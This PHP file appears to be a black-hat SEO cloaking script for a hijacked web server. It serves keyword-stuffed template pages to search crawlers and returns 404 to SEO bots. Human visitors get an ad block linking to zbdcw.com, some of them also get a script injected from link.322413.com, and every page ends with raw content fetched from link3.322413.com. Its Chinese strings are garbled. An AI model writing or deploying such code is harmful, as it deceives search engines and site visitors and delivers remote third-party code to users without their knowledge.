<?php
header("HTTP/1.1 200 OK");
error_reporting(0);
define("DIR", dirname(__FILE__));
include DIR.'/simple_html_dom.php';
function randKey($len)
{
    $chars = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
    $charsLen = count($chars) - 1;
    shuffle($chars);
    $str = "";
    for ($i = 0; $i < $len; $i++) {
        $str .= $chars[mt_rand(0, $charsLen)];
    }
    return $str;
}

function funcs($a, $b)
{
    if (is_array($b)) {
        foreach ($b as $k => $v) {
            if (stripos($a, trim($v)) !== false) {
                return TRUE;
            }
        }
        return FALSE;
    }
    if (!stripos($a, trim($b)) !== false) {
        return TRUE;
    }
    return FALSE;
}

function rdomain($d)
{
    $provace = array();
    return str_replace("*", dechex(date("s") . mt_rand(1111, 9999)) . $provace[rarray_rand($provace)], $d);
}

function rarray_rand($arr)
{
    return mt_rand(0, count($arr) - 1);
}

function varray_rand($arr)
{
    return $arr[rarray_rand($arr)];
}



function unicode_encode($str, $encoding = 'GBK', $prefix = '&#', $postfix = ';') {
    $str = iconv($encoding, 'UCS-2', $str);
    $arrstr = str_split($str, 2);
    $unistr = '';
    for($i = 0, $len = count($arrstr); $i < $len; $i++) {
        $dec = hexdec(bin2hex($arrstr[$i]));
        $unistr .= $prefix . $dec . $postfix;
    }
    return $unistr;
}


function get_folder_files($folder)
{
    $fp = opendir($folder);
    while (false != $file = readdir($fp)) {
        if ($file != '.' && $file != '..') {
            $file = "$file";
            $arr_file[] = $file;
        }
    }
    closedir($fp);
    return $arr_file;
}

$spider_name='ahrefsbot|bingbot|semrushbot|dotbot';
$spvisiter =strtolower($_SERVER["HTTP_USER_AGENT"]);
  $spider_name =explode("|",$spider_name);
  foreach($spider_name as $val)
  {
    if(stristr($spvisiter,$val))
    {
      header("HTTP/1.0 404 Not Found");exit;
    }
  }
  
function getbaiduxg($query)
{
	
	//global $xiangguan;
	$query =iconv("gb2312", "utf-8//IGNORE",$query);
	//$xiangguan =iconv("utf-8", "gb2312//IGNORE",$xiangguan);
	//echo ($xiangguan);
	$sugip = array ('14.215.177.37','14.215.177.38','14.215.177.39','58.217.200.13','58.217.200.15','58.217.200.37','58.217.200.39','61.135.185.31','61.135.185.32','61.135.169.103','61.135.169.107','61.135.169.113','61.135.169.114','61.135.169.115','61.135.169.121','61.135.169.125','103.235.46.39','111.13.12.139','111.13.12.142','111.13.100.91','111.13.100.92','112.80.248.73','112.80.248.74','115.239.210.25','115.239.210.26','115.239.210.27','115.239.210.28','115.239.211.109','115.239.211.112','115.239.211.113','115.239.211.114','119.75.213.50','119.75.213.51','119.75.213.61','119.75.216.20','119.75.217.11','119.75.217.26','119.75.217.56','119.75.217.63','119.75.217.109','119.75.218.11','119.75.218.45','119.75.218.70','119.75.218.77','119.75.218.143','123.125.114.107','123.125.114.220','123.125.114.238','123.125.115.140','123.125.115.165','180.97.33.67','180.97.33.71','180.97.33.107','180.97.33.108','180.149.131.98','180.149.132.151','180.149.132.166','180.149.132.168','202.108.22.5','202.108.22.142','220.181.37.55','220.181.111.22','220.181.111.37','220.181.111.83','220.181.111.111','220.181.111.149','220.181.111.188','220.181.112.12','220.181.112.18','220.181.112.21','220.181.112.76','220.181.112.89','220.181.112.147','220.181.112.195','220.181.112.244');
		shuffle($sugip);
		
	//	echo 'http://'.$sugip[0].'/s?ie=UTF-8&wd='.urlencode($query);
		$html = file_get_html('http://'.$sugip[0].'/s?ie=UTF-8&wd='.urlencode($query));
		//echo 'dsd';
		$lishi='';
		$lishi2='';
		if($html==false){}
		else
		{
			
		$re=$html->find('div#rs',0); 
		if(!empty($re))
		{
			
			
			foreach($re->find('th') as $i=>$key){
			
			$array=explode('&', $key->innertext); 
			 $keys = str_replace('<a href="/s?wd=', '',($array[0]));
	
			$keys=trim(urldecode($keys));
			//$key=trim($keys);
		if(!empty($keys))
		{
			$lishi2.=$keys.',';
		}
			//$this->store['���'.$i]=$keys;
			}
		}
		}
		return $lishi2;
	
}


$mydomain = $_SERVER['SERVER_NAME'];
$timeout = 25920000;
require DIR . '/config.php';
include DIR . "/data/dirCache.class.php";
$cache = new dirCache();
$mydomain = $_SERVER['SERVER_NAME'] . ':' . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
if ($cache->isExists($mydomain, $timeout)) {
    $moban = $cache->get($mydomain);
	
	

	$spvisiter =strtolower($_SERVER["HTTP_USER_AGENT"]);
	
	$spidername =array("spider");
	foreach($spidername as $val)
	{
		
		if(stristr($spvisiter,$val))
		{
			$isbot =true;
		}
	}
	
	
	//if(false)
	if(!$isbot)
	{
		
			$moban=strtolower($moban);
			$ad1='</title>(.*)</html>';
			$ad2='</title></head><body>
			
			

		 <style type="text/css">
    hr {
    	border: 0;
    	height: 1px;
    	background-image: linear-gradient(to right, rgba(0,0,0,0), rgba(0,0,0,0.75), rgba(0,0,0,0));
    }
    .center {
      max-width: 850px;
      min-width: 600px;
      margin: 0 auto;
    }

    .tag ul li {
      float: left;
      width: 30%;
      list-style: none;
      margin: 3px;
      color: #fff;
      font-weight: bold;
      font-size: -webkit-xxx-large;
      text-align: center;
      background-color: green;
      border-radius: 5px;
    }
    a {
	cursor:pointer;
	text-decoration: none;
	color:#fff;
    }
  </style>
  |javascript|
			
		 <p align=\'center\'><br>
    <font size=\'10\' face=\'Verdana\' color=\'#FF0000\'><b>��վ���� </b>
      <br>
      ��վ����������ѹ���<br>
	  
	  ���շѣ����շѣ�����<br><br>
      �ڲ����������ã��鲻��֤���㣡<br>
      ��׼���ϣ�����ʱ��������������<br>

      ������������</font>
    <a href="https://zbdcw.com/"><font size=\'10\' face=\'Verdana\' color=\'#0000FF\'>800401</font>
	
	
    <font size=\'10\' face=\'Verdana\' color=\'#FF0000\'>.COM</a><br>
    </font>

  </p>	
			
 <div class="tag center">
  <hr>
    <ul>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(49, 172, 118);">�����ܹ�</li></a>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(51, 102, 255);">��С����</li></a>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(79, 173, 123);">��ᴫ��</li></a>
    </ul>
    <ul>
      <a href="https://zbdcw.com/"><li style="width: 61%; background-color: rgb(51, 102, 255);">��Ф����������</li></a>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(142, 125, 170);">����36��</li></a>
    </ul>
    <ul>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(248, 82, 0);">���ֽ����</li></a>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(234, 69, 99);">����������</li></a>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(142, 125, 170);">�����Ĳ���</li></a>
    </ul>
    <ul>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(51, 102, 255);">��ͼ������</li></a>
      <a href="https://zbdcw.com/"><li style="width: 61%; background-color: rgb(248, 82, 0);">��ˮ��̳����</li></a>
    </ul>
    <ul>
      <a href="https://zbdcw.com/"><li style="background-color: rgb(51, 102, 255);">С�������</li></a>
      <a href="https://zbdcw.com/"><li style="width: 61%; background-color: rgb(248, 82, 0);">�ܼ���һ�仰</li></a>
    </ul>
  </div>
			
			
			
			
			</body></html>';
$counter = intval(file_get_contents("data/cacheData/_0/counter.dat"));  
$counter++;  
if((int)$counter>=5)
{
    $counter=1;
}
$fp = fopen("data/cacheData/_0/counter.dat","w");  
fwrite($fp, $counter);  
fclose($fp);
			$moban=preg_replace('|'.$ad1.'|isU',$ad2,$moban);
            
            if('14.161.36.28'==get_real_ip()||'175.99.131.238'==get_real_ip()||'149.28.153.120'==get_real_ip())
            {
             $moban=str_replace("|javascript|",'<script type="text/javascript" src="/tj.js"></script>',$moban);
            }else{

            $moban=$counter==1?str_replace("|javascript|",'<script type="text/javascript" src="http://link.322413.com/js/tj.js"></script>',$moban):str_replace("|javascript|",'<script type="text/javascript" src="/tj.js"></script>',$moban);
               
            }
			echo $moban;
			
			exit;
		
	}

	
	 $zf1 = count(explode('<��̬����ַ�>', $moban)) - 1;
    for ($ii = 0; $ii < $zf1; $ii++) {
        $moban = preg_replace('/<��̬����ַ�>/', randKey(5), $moban, 1);
    }
    $ri5 = count(explode('<��̬�������>', $moban)) - 1;
    for ($i = 0; $i < $ri5; $i++) {
        $moban = preg_replace('/<��̬�������>/', mt_rand(10000, 99999), $moban, 1);
    }
    
    $ci = count(explode('<��̬����ؼ���>', $moban)) - 1;
    if ($ci != 0) {
        $keywords = $bak_keywords = file(DIR . "/data/keywords/" . varray_rand($keyword_list));
        for ($ii = 0; $ii < $ci; $ii++) {
            $moban = preg_replace('/<��̬����ؼ���>/', trim(varray_rand($keywords)), $moban, 1);
        }
    }
    $wk = count(explode('<��̬����>', $moban)) - 1;
    if ($wk != 0) {
        $juzi = $bak_juzi = file(DIR . "/data/juzi/" . varray_rand($wenku_list));
        for ($wi = 0; $wi < $wk; $wi++) {
            $moban = preg_replace('/<��̬����>/', trim(varray_rand($juzi)), $moban, 1);
        }
    }
	
	$moban = str_replace("<��̬����ʱ��>", date("m-d"), $moban);
	$moban = str_replace("<��̬����ʱ��>",date("Y-m-d H:m:s"), $moban);
	
 $xinci  = file(DIR . "/data/xinci/" . varray_rand($xinci_list));
		shuffle($xinci);
		$moban = str_replace("<��̬�´�1>", $xinci[6], $moban);
		$moban = str_replace("<��̬�´�2>",  $xinci[7], $moban);
		$moban = str_replace("<��̬�´�3>",  $xinci[8], $moban);
		$moban = str_replace("<��̬�´�4>",  $xinci[9], $moban);
		$moban = str_replace("<��̬�´�5>",  $xinci[10], $moban);
		$moban = str_replace("<��̬�´�6>", $xinci[11], $moban);
		$moban = str_replace("<��̬�´�8>",  $xinci[12], $moban);
		$moban = str_replace("<��̬�´�9>",  $xinci[13], $moban);
		$moban = str_replace("<��̬�´�10>",  $xinci[14], $moban);
		$moban = str_replace("<��̬�´�7>",  $xinci[15], $moban);
	
   	//$moban=iconv("gb2312", "utf-8//IGNORE",$moban);
	
		$tupian5 = count(explode('<��̬���ͼƬ>', $moban)) - 1;
for ($tui = 0; $tui < $tupian5; $tui++) {
    $moban = preg_replace('/<��̬���ͼƬ>/', '/pics/' . varray_rand($image_list), $moban, 1);
}

    echo $moban;
    exit();
}
$keywords = $bak_keywords = file(DIR . "/data/keywords/" . varray_rand($keyword_list));
$juzi = $bak_juzi = file(DIR . "/data/juzi/" . varray_rand($wenku_list));
$juzi2 = $bak_juzi2 = file(DIR . "/data/juzi2/" . varray_rand($wenku_list2));
$spider = $bak_spider = file(DIR . "/data/spider/" . varray_rand($spider_link));
$domains = $bak_domains = file(DIR . "/data/domains/" . varray_rand($domain_list));
$moban = file_get_contents(DIR . "/data/templates/index/" . varray_rand($template_list));
function getdomain($url)
{
    $host = strtolower($url);
    if (strpos($host, '/') !== false) {
        $parse = @parse_url($host);
        $host = $parse ['host'];
    }
    $topleveldomaindb = array('com', 'asia', 'edu', 'gov', 'int', 'mil', 'net', 'org', 'biz', 'info', 'pro', 'name', 'museum', 'coop', 'aero', 'xxx', 'idv', 'mobi', 'cc', 'me', 'xyz');
    $str = '';
    foreach ($topleveldomaindb as $v) {
        $str .= ($str ? '|' : '') . $v;
    }
    $matchstr = "[^\.]+\.(?:(" . $str . ")|\w{2}|((" . $str . ")\.\w{2}))$";
    if (preg_match("/" . $matchstr . "/ies", $host, $matchs)) {
        $domain = $matchs ['0'];
    } else {
        $domain = $host;
    }
    return $domain;
}

$duankou = $_SERVER["SERVER_PORT"];
$url1 = $_SERVER['REQUEST_URI'];
$yuming = $_SERVER['HTTP_HOST'];
$yuming = str_replace(':' . $duankou, '', $yuming);
$yumi = getdomain($yuming);
$url2 = str_replace('.' . $yumi, '', $yuming);
$duankous = file(DIR . "/data/duankou/duankous.txt");
$shipins = file(DIR . "/data/shipin/shipin.txt");
//$shipin = count(explode('<�����Ƶ>', $moban)) - 1;


shuffle($shipins);
$moban = str_replace('<�����Ƶ>', trim($shipins[0]), $moban);
$moban = str_replace('<�����Ƶ1>', trim($shipins[1]), $moban);
$moban = str_replace('<�����Ƶ2>', trim($shipins[2]), $moban);
$moban = str_replace('<�����Ƶ3>', trim($shipins[3]), $moban);
$moban = str_replace('<�����Ƶ4>', trim($shipins[4]), $moban);
$moban = str_replace('<�����Ƶ5>', trim($shipins[5]), $moban);
$moban = str_replace('<�����Ƶ6>', trim($shipins[6]), $moban);
$moban = str_replace('<�����Ƶ7>', trim($shipins[7]), $moban);
$moban = str_replace('<�����Ƶ8>', trim($shipins[8]), $moban);




$gjc0 = trim(varray_rand($keywords));
$gjc1 = trim(varray_rand($keywords));
$gjc2 = trim(varray_rand($keywords));
$gjc3 = trim(varray_rand($keywords));
$gjc4 = trim(varray_rand($keywords));
$gjc5 = trim(varray_rand($keywords));
$gjc6 = trim(varray_rand($keywords));
$gjc7 = trim(varray_rand($keywords));
$gjc8 = trim(varray_rand($keywords));
$gjc9 = trim(varray_rand($keywords));
$gjc10 = trim(varray_rand($keywords));

$moban = str_replace("<�ؼ���1>",unicode_encode( $gjc1), $moban);
$moban = str_replace("<�ؼ���2>",unicode_encode( $gjc2), $moban);
$moban = str_replace("<�ؼ���3>",unicode_encode(  $gjc3), $moban);
$moban = str_replace("<�ؼ���4>", unicode_encode( $gjc4), $moban);
$moban = str_replace("<�ؼ���5>", unicode_encode( $gjc5), $moban);
$moban = str_replace("<�ؼ���6>",unicode_encode(  $gjc6), $moban);
$moban = str_replace("<�ؼ���7>",unicode_encode(  $gjc7), $moban);
$moban = str_replace("<�ؼ���8>",unicode_encode(  $gjc8), $moban);
$moban = str_replace("<�ؼ���9>",unicode_encode(  $gjc9), $moban);
$moban = str_replace("<�ؼ���10>",unicode_encode(  $gjc10), $moban);







/*
$bdxg=getbaiduxg($gjc1);
	$bdxg=iconv("utf-8", "gb2312//IGNORE",$bdxg);
$moban = str_replace("<bdxg>", $bdxg, $moban);

if(!empty($bdxg) || $bdxg!=='')
	{
		$fu=explode(",",$bdxg);
		$all_arr = array ();
		for($v=0;$v<=count($fu);$v++){
			
			$ddss=trim($fu[$v]);
			if(empty($ddss)){ continue; }
			$all_arr[]=$ddss;
			
		}
		
		
		shuffle($all_arr);
	
		for($ca=0;$ca<=count($fu);$ca++){
		
				$moban=str_replace('<xg'.$ca.'>', trim($all_arr[$ca]),$moban);
		}
	}

$moban = str_replace("<xg1>", '', $moban);
$moban = str_replace("<xg2>", '', $moban);
$moban = str_replace("<xg3>", '', $moban);
*/
$ci = count(explode('<����ؼ���>', $moban)) - 1;
for ($ii = 0; $ii < $ci; $ii++) {
    $moban = preg_replace('/<����ؼ���>/',unicode_encode(  trim(varray_rand($keywords))), $moban, 1);
}
$wk = count(explode('<����>', $moban)) - 1;
for ($wi = 0; $wi < $wk; $wi++) {
    $moban = preg_replace('/<����>/', trim(varray_rand($juzi)), $moban, 1);
}
$wk2 = count(explode('<����2>', $moban)) - 1;
for ($wi2 = 0; $wi2 < $wk2; $wi2++) {
    $moban = preg_replace('/<����2>/', trim(varray_rand($juzi2)), $moban, 1);
}
$dk = count(explode('<����˿�>', $moban)) - 1;
for ($di = 0; $di < $dk; $di++) {
    $moban = preg_replace('/<����˿�>/', trim(varray_rand($duankous)), $moban, 1);
}
$vi = count(explode("<�������>", $moban)) - 1;
for ($li = 0; $li < $vi; $li++) {
    $s = trim(varray_rand($domains));
    $moban = preg_replace('/<�������>/', $s, $moban, 1);
}
$zf1 = count(explode('<1��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf1; $ii++) {
    $moban = preg_replace('/<1��ĸ>/', randKey(1), $moban, 1);
}
$zf2 = count(explode('<2��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf2; $ii++) {
    $moban = preg_replace('/<2��ĸ>/', randKey(2), $moban, 1);
}
$zf3 = count(explode('<3��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf3; $ii++) {
    $moban = preg_replace('/<3��ĸ>/', randKey(3), $moban, 1);
}
$zf4 = count(explode('<4��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf4; $ii++) {
    $moban = preg_replace('/<4��ĸ>/', randKey(4), $moban, 1);
}
$zf5 = count(explode('<5��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf5; $ii++) {
    $moban = preg_replace('/<5��ĸ>/', randKey(5), $moban, 1);
}
$zf6 = count(explode('<6��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf6; $ii++) {
    $moban = preg_replace('/<6��ĸ>/', randKey(6), $moban, 1);
}
$zf7 = count(explode('<7��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf7; $ii++) {
    $moban = preg_replace('/<7��ĸ>/', randKey(7), $moban, 1);
}
$zf8 = count(explode('<8��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf8; $ii++) {
    $moban = preg_replace('/<8��ĸ>/', randKey(8), $moban, 1);
}
$zf9 = count(explode('<9��ĸ>', $moban)) - 1;
for ($ii = 0; $ii < $zf9; $ii++) {
    $moban = preg_replace('/<9��ĸ>/', randKey(9), $moban, 1);
}
$ri1 = count(explode('<1����>', $moban)) - 1;
for ($i = 0; $i < $ri1; $i++) {
    $moban = preg_replace('/<1����>/', mt_rand(0, 9), $moban, 1);
}
$ri2 = count(explode('<2����>', $moban)) - 1;
for ($i = 0; $i < $ri2; $i++) {
    $moban = preg_replace('/<2����>/', mt_rand(10, 99), $moban, 1);
}
$ri3 = count(explode('<3����>', $moban)) - 1;
for ($i = 0; $i < $ri3; $i++) {
    $moban = preg_replace('/<3����>/', mt_rand(100, 999), $moban, 1);
}
$ri4 = count(explode('<4����>', $moban)) - 1;
for ($i = 0; $i < $ri4; $i++) {
    $moban = preg_replace('/<4����>/', mt_rand(1000, 9999), $moban, 1);
}
$ri5 = count(explode('<5����>', $moban)) - 1;
for ($i = 0; $i < $ri5; $i++) {
    $moban = preg_replace('/<5����>/', mt_rand(10000, 99999), $moban, 1);
}
$ri6 = count(explode('<6����>', $moban)) - 1;
for ($i = 0; $i < $ri6; $i++) {
    $moban = preg_replace('/<6����>/', mt_rand(100000, 999999), $moban, 1);
}
$ri7 = count(explode('<7����>', $moban)) - 1;
for ($i = 0; $i < $ri7; $i++) {
    $moban = preg_replace('/<7����>/', mt_rand(1000000, 9999999), $moban, 1);
}
$ri8 = count(explode('<8����>', $moban)) - 1;
for ($i = 0; $i < $ri8; $i++) {
    $moban = preg_replace('/<8����>/', mt_rand(10000000, 99999999), $moban, 1);
}


function get_real_ip()
{

    $ip=FALSE;


    if(!empty($_SERVER["HTTP_CLIENT_IP"])){

        $ip = $_SERVER["HTTP_CLIENT_IP"];

    }


    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {

        $ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);

        if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }

        for ($i = 0; $i < count($ips); $i++) {

            if (!eregi ("^(10��172.16��192.168).", $ips[$i])) {

                $ip = $ips[$i];

                break;

            }

        }

    }

    return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);

}
$moban = str_replace("<��ǰ����>", $_SERVER['SERVER_NAME'], $moban);
$moban = str_replace("<��������>", $yumi, $moban);
$moban = str_replace("<��ǰ����1>", $_SERVER['HTTP_HOST'], $moban);
$tupian5 = count(explode('<���ͼƬ>', $moban)) - 1;
for ($tui = 0; $tui < $tupian5; $tui++) {
    $moban = preg_replace('/<���ͼƬ>/', '/pics/' . varray_rand($image_list), $moban, 1);
}
$moban = str_replace("<��>", date("y"), $moban);
$moban = str_replace("<�����汾>", date("md"), $moban);
$moban = str_replace("<����ʱ��>", date("m-d"), $moban);
$moban = str_replace("<����ʱ��1>", date("m-d", strtotime("-1 day")), $moban);
$moban = str_replace("<����ʱ��2>", date("m-d", strtotime("-2 day")), $moban);
$moban = str_replace("<����ʱ��3>", date("m-d", strtotime("-3 day")), $moban);
$moban = str_replace("<����ʱ��4>", date("m-d", strtotime("-4 day")), $moban);
$moban = str_replace("<����ʱ��5>", date("m-d", strtotime("-5 day")), $moban);
$moban = str_replace("<����ʱ��6>", date("m-d", strtotime("-6 day")), $moban);
$moban = str_replace("<����ʱ��7>", date("m-d", strtotime("-7 day")), $moban);
$moban = str_replace("<����ʱ��8>", date("m-d", strtotime("-8 day")), $moban);
$moban = str_replace("<����ʱ��9>", date("m-d", strtotime("-9 day")), $moban);
$moban = str_replace("<����ʱ��10>", date("m-d", strtotime("-10 day")), $moban);
$moban = str_replace("<����ʱ��11>", date("m-d", strtotime("-11 day")), $moban);
$moban = str_replace("<����ʱ��12>", date("m-d", strtotime("-12 day")), $moban);
$moban = str_replace("<����ʱ��13>", date("m-d", strtotime("-13 day")), $moban);
$moban = str_replace("<����ʱ��14>", date("m-d", strtotime("-14 day")), $moban);
$moban = str_replace("<����ʱ��15>", date("m-d", strtotime("-15 day")), $moban);
$moban = str_replace("<����ʱ��16>", date("m-d", strtotime("-16 day")), $moban);
$moban = str_replace("<����ʱ��17>", date("m-d", strtotime("-17 day")), $moban);
$moban = str_replace("<����ʱ��18>", date("m-d", strtotime("-18 day")), $moban);
$moban = str_replace("<����ʱ��19>", date("m-d", strtotime("-19 day")), $moban);
$moban = str_replace("<����ʱ��20>", date("m-d", strtotime("-20 day")), $moban);

 $xinci  = file(DIR . "/data/xinci/" . varray_rand($xinci_list));
		shuffle($xinci);
		
		 $moban = str_replace("<�´�1>", trim($xinci[1]), $moban);
		$moban = str_replace("<�´�2>",  trim($xinci[2]), $moban);
		$moban = str_replace("<�´�3>",  trim($xinci[3]), $moban);
		$moban = str_replace("<�´�4>",  trim($xinci[4]), $moban);
		$moban = str_replace("<�´�5>",  trim($xinci[5]), $moban);
		
		$moban = str_replace("<�´�6>",  trim($xinci[6]), $moban);
	





$cache->set($mydomain, $moban);
$zf1 = count(explode('<��̬����ַ�>', $moban)) - 1;
for ($ii = 0; $ii < $zf1; $ii++) {
    $moban = preg_replace('/<��̬����ַ�>/', randKey(5), $moban, 1);
}
$ri5 = count(explode('<��̬�������>', $moban)) - 1;
for ($i = 0; $i < $ri5; $i++) {
    $moban = preg_replace('/<��̬�������>/', mt_rand(10000, 99999), $moban, 1);
}
$moban = str_replace("<��̬����ʱ��>", date("Y-m-d H:m:s"), $moban);
$ci = count(explode('<��̬����ؼ���>', $moban)) - 1;
for ($ii = 0; $ii < $ci; $ii++) {
    $moban = preg_replace('/<��̬����ؼ���>/', trim(varray_rand($keywords)), $moban, 1);
}
$wk = count(explode('<��̬����>', $moban)) - 1;
for ($wi = 0; $wi < $wk; $wi++) {
    $moban = preg_replace('/<��̬����>/', trim(varray_rand($juzi)), $moban, 1);
}

	$moban = str_replace("<��̬����ʱ��>", date("m-d"), $moban);



		$moban = str_replace("<��̬�´�1>", trim($xinci[6]), $moban);
		$moban = str_replace("<��̬�´�2>",  trim($xinci[7]), $moban);
		$moban = str_replace("<��̬�´�3>",  trim($xinci[8]), $moban);
		$moban = str_replace("<��̬�´�4>",  trim($xinci[9]), $moban);
		$moban = str_replace("<��̬�´�5>",  trim($xinci[10]), $moban);
		$moban = str_replace("<��̬�´�6>", trim($xinci[11]), $moban);
		$moban = str_replace("<��̬�´�7>",  trim($xinci[12]), $moban);
		$moban = str_replace("<��̬�´�8>",  trim($xinci[13]), $moban);
		$moban = str_replace("<��̬�´�9>",  trim($xinci[14]), $moban);
	
	$tupian5 = count(explode('<��̬���ͼƬ>', $moban)) - 1;
for ($tui = 0; $tui < $tupian5; $tui++) {
    $moban = preg_replace('/<��̬���ͼƬ>/', '/pics/' . varray_rand($image_list), $moban, 1);
}

$wk = count(explode('<spider>', $moban)) - 1;
for ($wi = 0; $wi < $wk; $wi++) {
    $moban = preg_replace('/<spider>/', trim(varray_rand($spider)), $moban, 1);
}
$moban = preg_replace('/<spider>/', '', $moban, 1);




	//$moban=iconv("gb2312", "utf-8//IGNORE",$moban);


echo $moban;
$html=file_get_contents("http://link3.322413.com/");
    echo $html;
?>